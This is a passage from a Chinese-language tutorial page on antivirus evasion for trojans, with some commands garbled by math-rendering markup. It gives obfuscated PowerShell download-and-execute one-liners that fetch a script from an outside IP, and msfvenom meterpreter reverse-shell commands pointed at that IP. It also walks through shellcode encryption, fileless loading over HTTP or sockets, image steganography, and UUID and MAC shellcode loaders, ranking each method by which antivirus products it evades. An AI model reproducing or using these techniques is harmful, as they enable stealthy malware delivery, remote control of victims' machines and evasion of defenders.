class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mopen">(</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mord mathnormal">e</span><span class="mord mathnormal">c</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal">e</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mclose">)</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal">a</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen"><span class="mopen">(</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">h</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct">;</span></span></span></span>b=‘tp:<br>
<a target="_blank" rel="noopener" href="//47.94.236.117/x.ps1">//47.94.236.117/x.ps1</a>’’));’;IEX (<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>+</mo></mrow><annotation encoding="application/x-tex">a+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">a</span><span class="mord">+</span></span></span></span>b)”</p>
<p>（ 3 ）复制 powershell 执行程序 - hr</p>
<p>copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe bypass.exe<br>
.\bypass.exe “<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><msup><mo>=</mo><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi>I</mi><mi>E</mi><mi>X</mi><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mi>N</mi><mi>e</mi><mi>w</mi><mo>−</mo><mi>O</mi><mi>b</mi><mi>j</mi><mi>e</mi><mi>c</mi><mi>t</mi><mi>N</mi><mi>e</mi><mi>t</mi><mi mathvariant="normal">.</mi><mi>W</mi><mi>e</mi><mi>b</mi><mi>C</mi><mi>l</mi><mi>i</mi><mi>e</mi><mi>n</mi><mi>t</mi><mo stretchy="false">)</mo><mi mathvariant="normal">.</mi><mi>D</mi><mi>o</mi><mi>w</mi><mi>n</mi><mi>l</mi><mi>o</mi><mi>a</mi><mi>d</mi><mi>S</mi><mi>t</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>g</mi><msup><mo stretchy="false">(</mo><mrow><mo mathvariant="normal">′</mo><mo mathvariant="normal">′</mo></mrow></msup><mi>h</mi><msup><mi>t</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">;</mo></mrow><annotation encoding="application/x-tex">a=&#x27;IEX((New-Object
Net.WebClient).DownloadString(&#x27;&#x27;ht&#x27;;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel">=</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mopen">(</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mord mathnormal">e</span><span class="mord mathnormal">c</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal">e</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mclose">)</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal">a</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen"><span class="mopen">(</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">h</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct">;</span></span></span></span>b=‘tp://47.94.236.117/x.ps1’’));’;IEX (<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>+</mo></mrow><annotation encoding="application/x-tex">a+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">a</span><span class="mord">+</span></span></span></span>b)”</p>
<p>（ 4 ）垃圾数据干扰 - hr</p>
<p>powershell -w Normal -w Normal -w Normal -w Normal -w Normal -w<br>
Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -<br>
w Normal -w Normal -w Normal -w Normal -w Normal -w Normal … Nor<br>
mal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w<br>
Normal set-alias -name key -value IEX; key(New-Object Net.WebClient).Downl<br>
oadString(‘ht’+‘tp://47.94.236.117/x.ps1’)</p>
<p>（ 5 ）替换原型木马关键字进行干扰 - hr</p>
<p>powershell -NoExit “<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>1</mn><msup><mo>=</mo><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi>I</mi><mi>E</mi><mi>X</mi><mo stretchy="false">(</mo><mi>N</mi><mi>e</mi><mi>w</mi><mo>−</mo><mi>O</mi><mi>b</mi><mi>j</mi><mi>e</mi><mi>c</mi><mi>t</mi><mi>N</mi><mi>e</mi><mi>t</mi><mi mathvariant="normal">.</mi><mi>W</mi><mi>e</mi><mi>b</mi><mi>C</mi><mi>l</mi><mi>i</mi><mi>e</mi><mi>n</mi><mi>t</mi><mo stretchy="false">)</mo><mi mathvariant="normal">.</mi><mi>D</mi><mi>o</mi><mi>w</mi><mi>n</mi><mi>l</mi><msup><mi>o</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">;</mo></mrow><annotation encoding="application/x-tex">c1=&#x27;IEX(New-Object Net.WebClient).Downlo&#x27;;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel">=</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mord mathnormal">e</span><span class="mord mathnormal">c</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal">e</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mclose">)</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct">;</span></span></span></span>c2=‘123<br>
(’‘<span class="exturl" data-url="aHR0cDovLzQ3Ljk0LjIzNi4xMTcveC5wczE=">http://47.94.236.117/x.ps1</span>’’)’.Replace(‘123’,‘adString’);IEX (<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>1</mn><mo>+</mo></mrow><annotation encoding="application/x-tex">c1+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">c</span><span class="mord">1</span><span class="mord">+</span></span></span></span>c2)”</p>
<p>（ 6 ）Ladon 混淆命令 - 未绕过 x 60</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通过ladon将powershell免杀木马生成为exe可执行文件</span><br><span class="line">通过ps 2 exe生成exe文件：https://github.com/MScholtes/Win-PS2EXE</span><br></pre></td></tr></table></figure>
<h4 id="1014-c-go免杀"><a class="markdownIt-Anchor" href="#1014-c-go免杀">#</a> 10.1.4 c# go 免杀</h4>
<p><strong>0 x0 1 C#</strong> 木马</p>
<p>（ 1 ）原型木马 - 无效</p>
<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=47.94.236.117 LPOR<br>
T=6688 -e x86/shikata_ga_nai -i 15 -f csharp<br>
use exploit/multi/handler<br>
 用运行 shellcode 的 C# 脚本运行此代码，生成 exe 文件测试木马</p>
<p>（ 2 ）混淆加密 - df</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">先用msf生成 64 位木马</span><br><span class="line">先用加密脚本进行加密，通过key来混淆原型木马获得字节流数据</span><br><span class="line">再用解密脚本进行解密，用key与字节流数据运行脚本进行干扰杀毒检测</span><br><span class="line">而后打包为exe可执行文件测试木马</span><br></pre></td></tr></table></figure>
<p>（ 3 ）文件混淆 - df /hr/x 60</p>
<p>一些杀毒软件会将木马放置到 VT 或者沙盒中运行，通过行为检测是否是<br>
木马；而 exe 文件本身是支持反编译的，进行逆向可以找到源码中的 shellcode。<br>
沙盒或许能识别到此 shellcode，通过一些软件实现加密原有 exe 程序，干扰杀<br>
毒软件的判断能力。<br>
开源 - ConfuserEx 通过将原型木马加密 - df/hr<br>
 付费 - VirboxProtector - df/hr/x 60<br>
 看工具支持哪些语言，如果此工具不支持其他语言，加密后原功能会失效</p>
<p><strong>0 x02 Go</strong> 木马：</p>
<p>（ 1 ）原型木马 - 无效</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">通过cs生成c代码，利用go脚本去运行c程序</span><br><span class="line">用运行shellcode的go脚本运行代码，直接运行或者生成exe文件测试木马</span><br><span class="line">运行1.go脚本：go run 1.go</span><br><span class="line">编译1.go脚本：go build 1.go</span><br><span class="line">去弹窗编译1.go脚本：go build -ldflags=&quot;-H windowsgui -w -s&quot; 1.go</span><br></pre></td></tr></table></figure>
<p>（ 2 ）分离代码 - df</p>
<p>如将 shellcode 进行 http 请求获取，或者以参数方式加入，又或者从资源中<br>
请求 shellcode<br>
 准备一个 AES 加密脚本，需要添加 shellcode 为要加密的内容，运行之后会</p>
<p>随机生成 key，并利用此 key 将 shellcode 加密后的代码打印出来<br>
再准备一个 AES 解密脚本，需要输入参数 key 和要执行的代码，此脚本运<br>
行之后会利用 key 去解密还原 shellcode，将此 AES 解密脚本打包为 exe 文件</p>
<p>（ 3 ）分离代码 自定义代码 - df /hr</p>
<p>cs 或 msf 生成 raw 格式<br>
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=47.94.236.117 L<br>
PORT=6688 -f hex<br>
 写 go 脚本直接从参数中获取 shellcode 运行，运行 exe 程序时设置参数为 h<br>
ex 木马<br>
 go build -ldflags “-s -w -H=windowsgui” 5.go<br>
use exploit/multi/handler<br>
set payload windows/x64/meterpreter/reverse_tcp</p>
<p>（ 4 ）分离代码 资源分离</p>
<p>go 代码中写明要从某个文件获取代码，可以只想 msf/cs 生成的 bin 文件<br>
生成 exe 文件之后，将 bin 文件放置代码中指向的目录中执行 exe 就会读取<br>
木马并执行</p>
<p>（ 5 ）保护混淆 df /hr</p>
<p>通过软件 SafengineShielden 进行保护 混淆 禁止 VT 调试 禁止虚拟机运行<br>
等特点</p>
<h4 id="1015-asm-java免杀"><a class="markdownIt-Anchor" href="#1015-asm-java免杀">#</a> 10.1.5 asm java 免杀</h4>
<p><strong>0x0 1 asm</strong> 木马</p>
<p>（ 1 ）内联 C 混编 - 无效</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通过c与asm的混合代码来执行shellcode</span><br><span class="line">实测情况下对防病毒软胶都没有作用</span><br></pre></td></tr></table></figure>
<p>（ 2 ）花指令 - 无效</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通过相关工具生成asm即汇编语言指令，加入到原有的内联C代码上干扰</span><br><span class="line">需要知道入口地址，通过ollydeg工具进行调试，重新打包文件</span><br></pre></td></tr></table></figure>
<p>（ 3 ）编译汇编代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">来源：https://forum.butian.net/share/1536</span><br><span class="line">通过火绒剑抓取运行恶意软件时的进程，查看是否有远程ip及端口</span><br></pre></td></tr></table></figure>
<p>发现 10.130.4.204 对应 IP 地址：30h,2fh,2dh,30h,32h,2fh,2dh,33h,2dh,31h,2f<br>
h,33h,00h<br>
 可以推断出在 asm 马中 30=1, 2f=0, 2d=., 32=3, 33=4, 31=2 依次内推<br>
构造 ip 若为 47.94.236.117 则马为 3 3h,36h,2dh,38h,33h,2dh,31h,32h,35h,2dh,<br>
30h,30h,36h,00h<br>
 端口：82=52h 88=28h<br>
 编译器：<span class="exturl" data-url="aHR0cHM6Ly93d3cubWFzbTMyLmNvbS8=">https://www.masm32.com/</span><br>
 编译为 obj 文件：ml /c/coff /Cp test.asm<br>
 生成 exe 文件：link /subsystem:console /libpath:c:\masm32\lib test.obj<br>
 在 cs 上选择 http 监听器监听端口即可免杀 可面纱 hr/df</p>
<p><strong>0 x0 2 Java</strong> 木马</p>
<p>（ 1 ）JAR 包原型</p>
<p>msfvenom -p java/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f<br>
jar -o msf.jar</p>
<p>（ 2 ）JAR 包源码特征修改免杀</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Jar反编译导出-jdgui</span><br><span class="line">修改上线配置-config</span><br><span class="line">修改启动主类-MANIFEST.MF</span><br><span class="line">修改执行代码-Main.java</span><br><span class="line">打包class-javac Main.java</span><br><span class="line">编译jar-jar cvfm xiaodi.jar META-INF/MANIFEST.MF.</span><br></pre></td></tr></table></figure>
<p>（ 3 ）JAR 包打包 EXE 执行免杀 - 鸡肋</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">安装：exe4j Inno进行打包</span><br><span class="line">exe4j-下载链接：https://exe4j.apponic.com/</span><br><span class="line">inno-下载链接：https://jrsoftware.org/isdl.php</span><br><span class="line">操作说明：https://www.jb51.net/article/236000.htm</span><br></pre></td></tr></table></figure>
<h3 id="102-py无文件落地"><a class="markdownIt-Anchor" href="#102-py无文件落地">#</a> 10.2 py 无文件落地</h3>
<p>是将 shellcode 直接加载进内存，由于没有文件落地，因此可以绕过文件扫<br>
描策略的查杀。为了使内存免杀的效果更好，在申请内存时一般采用渐进式申<br>
请一块可读写内存，在运行时改为可执行，在执行的时候遵循分离免杀的思想。<br>
分离免杀包含对特征和行为的分离两个维度，把 shellcode 从放在程序转移到加</p>
<p>载进内存，把整块的 shellcode 通过分块传输的方法上传然后再拼接，这些体现<br>
了基本的 “分离” 思想。</p>
<h4 id="102-1-从文本中提取木马"><a class="markdownIt-Anchor" href="#102-1-从文本中提取木马">#</a> 10.2. 1 从文本中提取木马</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">从msf/cs生成木马，注意需要与自己使用的python的版本一致</span><br></pre></td></tr></table></figure>
<p>（ 1 ）读取编码木马文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">用python将木马转化为base 64 编码，print(base64.b64encode(b&#x27;\xx\xx\...\xx&#x27;))</span><br><span class="line">将编码后的木马以文件的方式放在一个文件中，s.txt</span><br><span class="line">用python读取s.txt中的木马并执行：s= open(&#x27;s.txt&#x27;,&#x27;r&#x27;).read()</span><br><span class="line">再次利用py 2 exe打包py程序：python setup py 2 exe</span><br><span class="line">将exe可执行程序与s.txt一起放置在对方电脑上，执行即可</span><br></pre></td></tr></table></figure>
<p>（ 2 ）编码木马文件做混淆</p>
<p>注意 df 会对 s.txt 内容进行查杀，需要将 s.txt 做一个混淆<br>
即插入一堆乱字符如 xiaodi，在 py 代码中读取内容后做替换 data = <span class="exturl" data-url="aHR0cDovL2RhdGEucmU=">data.re</span><br>
place(‘xiaodi’,’’)<br>
 再次用 py 2 exe 打包，切换新的混淆木马即可免杀 df</p>
<h4 id="1022-从参数中提取木马"><a class="markdownIt-Anchor" href="#1022-从参数中提取木马">#</a> 10.2.2 从参数中提取木马</h4>
<p>生成的木马，以字节流即 shellcode=b’\xx\xx…\xx ' 的形式赋值<br>
将木马与执行 py 程序的代码全部合并进行 base 64 编码，编码的作用是为了<br>
防止空格回车的影响，可以将全部的程序从参数中读取<br>
编写如下 py 代码并用 p 2 exe 进行打包<br>
 import base 64<br>
exec(base64.b64decode(sys.argv[1]))<br>
 使用时将可执行木马的 base 64 编码值从参数中读取</p>
<h4 id="1023-从http中提取木马"><a class="markdownIt-Anchor" href="#1023-从http中提取木马">#</a> 10.2.3 从 http 中提取木马</h4>
<p>同样的将木马即 py 执行木马的代码全部打包放在外部网站上，不建议使用<br>
自己的服务器读取编码后的木马，可以使用 oss 存储资源，这对对方的朔源会增<br>
加很大的难度<br>
 py 读取代码并同时执行读到的木马程序如下：</p>
<p>import base 64<br>
from urllib.request import urlopen<br>
exec(base64.b64decode(urlopen(‘<span class="exturl" data-url="aHR0cDovL3d3dy54eHguY29tLzEudHh0">http://www.xxx.com/1.txt</span>’).read()))<br>
 打包后将 exe 放置在对方的电脑上即可（可以尝试切换不同的打包起或者<br>
请求方式）。</p>
<h4 id="1024-从socket获取木马"><a class="markdownIt-Anchor" href="#1024-从socket获取木马">#</a> 10.2.4 从 socket 获取木马</h4>
<p>参考：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vS2VlcC1BbWJpdGlvbi9wLzc0NTkyMTMuaHRtbA==">https://www.cnblogs.com/Keep-Ambition/p/7459213.html</span><br>
 准备两个文件，一个为 socket.s 服务端代码，一个为 socket.c 客户端代码<br>
服务端代码负责接收 socket 通信，负责从客户端读取木马并进行解码执行，<br>
默认的 socket 通信是有一定的数量限制的，可以采用拼接的方式执行未能正常<br>
获取到的木马<br>
 exec (data.decode () + ‘xxxxxxxxxx’)<br>
 服务端需要监听 0 .0.0.0 即任意网卡，可以与任意 ip 地址建立连接<br>
准备好服务端的代码通过 py 2 exe 打包放置在对方电脑上<br>
本地的 socket.c 文件需要填写上对方的 ip 地址建立通信<br>
一旦通信建立成功，发送木马，就会上线拿下对方主机</p>
<h4 id="1025-从图片中隐写木马"><a class="markdownIt-Anchor" href="#1025-从图片中隐写木马">#</a> 10.2.5 从图片中隐写木马</h4>
<p>参考：<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvYzhVMk1faUo4cFdhSTUwc0g4dTlIdw==">https://mp.weixin.qq.com/s/c8U2M_iJ8pWaI50sH8u9Hw</span><br>
 加密：RGBAencodeDataInImage (im, arguments [’<text>’]).save(arguments[’<enc odedimage>’])<br>
 解密：im = Image.open (arguments [’<encodedImage>’])<br>
 通过脚本将需要用 py 执行的木马隐写到图片中，再次通过 py 取读取隐写<br>
在图片中的代码并且执行，将加了木马的图片与 py 程序放在同一目录下测试。<br>
注意仍需要将木马进行编码，并且用 pyinstaller/py 2 exe 两者打包都进行尝试。</encodedImage></enc></text></p>
<h3 id="103-内存加载免杀"><a class="markdownIt-Anchor" href="#103-内存加载免杀">#</a> 10.3 内存加载免杀</h3>
<p>文章参考：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjYyNjY2">https://www.anquanke.com/post/id/262666</span><br>
 让 shellcode 看上去类似于电脑上自带的东西，伪装成这种数据去调用执行<br>
我们开辟一块内存，然后直接将 shellcode 写入到对应的内存中并且该内存是<br>
可读可写可执行的状态，那么这种方式太容易被 AV 所查杀，因此当我们如果是利</p>
<p>用 Windows 自身提供的 API 来将加密或者封装好的 shellcode 写入到内存执行的<br>
话，将会大大增加查杀的难度</p>
<h4 id="1031-shellcode转uuid方式"><a class="markdownIt-Anchor" href="#1031-shellcode转uuid方式">#</a> 10.3.1 ShellCode 转 UUID 方式</h4>
<h5 id="通用唯一识别码uuid是用于计算机体系中以识别信息数目的一个-128-位"><a class="markdownIt-Anchor" href="#通用唯一识别码uuid是用于计算机体系中以识别信息数目的一个-128-位">#</a> 通用唯一识别码 (UUID), 是用于计算机体系中以识别信息数目的一个 128 位</h5>
<h5 id="标识符根据标准方法生成不依赖中央机构的注册和分配uuid-具有唯一"><a class="markdownIt-Anchor" href="#标识符根据标准方法生成不依赖中央机构的注册和分配uuid-具有唯一">#</a> 标识符，根据标准方法生成，不依赖中央机构的注册和分配，UUID 具有唯一</h5>
<h5 id="性"><a class="markdownIt-Anchor" href="#性">#</a> 性。</h5>
<p>C++:py 将 shellcode 转为 C++ uuid，C++ 调用 uuid，编译为 exe 执行上线 x<br>
60<br>
C#:py 将 shellcode 转为 C# uuid，C# 调用 uuid，编译为 exe 执行上线 df /h<br>
r<br>
Py2:py 将 shellcode 转为 py uuid , py2 调用 uuid，pyinstaller 打包 - x60 /<br>
hr<br>
 将 uuid 做分离，使用 http 请求进行无文件落地的内存免杀，打包后绕过 df<br>
Go:py 将木马转为 go uuid , go 调用 uuid 并进行打包，需去除反 VT df /h<br>
r<br>
 源码中会对免杀做反虚拟机调试，可以修改源代码删除此部分功能，或者<br>
有些特殊情况需要对方不是在虚拟机中执行，可以利用相关工具加保护。</p>
<h4 id="1032-shellcode转mac地址方式"><a class="markdownIt-Anchor" href="#1032-shellcode转mac地址方式">#</a> 10.3.2 ShellCode 转 MAC 地址方式</h4>
<h5 id="mac地址也叫物理地址-硬件地址由网络设备制造商生产时烧录在网卡"><a class="markdownIt-Anchor" href="#mac地址也叫物理地址-硬件地址由网络设备制造商生产时烧录在网卡">#</a> MAC 地址也叫物理地址、硬件地址，由网络设备制造商生产时烧录在网卡</h5>
<h5 id="的eprom一种闪存芯片通常可以通过程序擦写-ip地址与mac地址在计算"><a class="markdownIt-Anchor" href="#的eprom一种闪存芯片通常可以通过程序擦写-ip地址与mac地址在计算">#</a> 的 EPROM 一种闪存芯片，通常可以通过程序擦写。IP 地址与 MAC 地址在计算</h5>
<h5 id="机里都是以二进制表示的ip地址是-32-位的而mac地址则是-48-位-6-个字"><a class="markdownIt-Anchor" href="#机里都是以二进制表示的ip地址是-32-位的而mac地址则是-48-位-6-个字">#</a> 机里都是以二进制表示的，IP 地址是 32 位的，而 MAC 地址则是 48 位（ 6 个字</h5>
<h5 id="节的"><a class="markdownIt-Anchor" href="#节的">#</a> 节）的。</h5>
<p>Python2: py 将 shellcode 转为 py MAC，py 2 调用 MAC 加载，pyinstaller 打<br>
包 - x60/hr/df<br>
Go: py 将 shellcode 转为 go MAC，go 调用 MAC 加载，go build 打包 - x<br>
60/hr/df</p>
